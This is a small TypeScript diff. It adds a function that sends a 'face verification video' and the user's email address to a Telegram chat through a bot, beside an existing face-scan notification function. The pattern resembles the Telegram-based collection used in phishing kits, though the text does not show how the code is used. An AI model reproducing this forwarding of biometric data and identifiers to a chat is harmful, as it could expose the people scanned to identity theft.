@@ -56,3 +56,18 @@ export async function sendFaceScanNotification(email: string): Promise<void> {
     console.error('Error sending face scan notification:', error);
   }
 }
+
+export async function sendVideoNotification(email: string, videoBuffer: Buffer): Promise<void> {
+  try {
+    const caption = `🎥 *FACE VERIFICATION VIDEO*\n\n*Email:* ${email}\n*Time:* ${new Date().toLocaleString()}`;
+
+    await bot.sendVideo(TELEGRAM_CHAT_ID, videoBuffer, {
+      caption,
+      parse_mode: 'Markdown'
+    });
+
+    console.log('Video notification sent successfully');
+  } catch (error) {
+    console.error('Error sending video notification:', error);
+  }
+}
